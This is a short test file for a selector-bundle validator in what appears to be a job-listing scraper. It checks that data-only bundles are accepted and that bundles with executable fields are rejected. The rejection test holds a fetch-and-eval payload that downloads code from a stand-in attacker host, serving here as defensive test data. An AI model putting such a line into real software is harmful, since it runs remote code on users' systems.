import { validateSelectorBundle } from "../src/selectors/validator";


it("accepts versioned data-only selector bundles", () => {
  const bundle = validateSelectorBundle({
    schemaVersion: 1,
    selectorVersion: "2026.08.18",
    platform: "boss",
    selectors: { title: ".job-name", description: ".job-detail-section" },
  });
  expect(bundle.platform).toBe("boss");
});


it("rejects remote executable fields", () => {
  expect(() =>
    validateSelectorBundle({
      schemaVersion: 1,
      selectorVersion: "2026.08.18",
      platform: "boss",
      selectors: { title: ".job-name" },
      script: "fetch('https://evil.example').then(eval)",
    }),
  ).toThrow(/data-only/i);
});

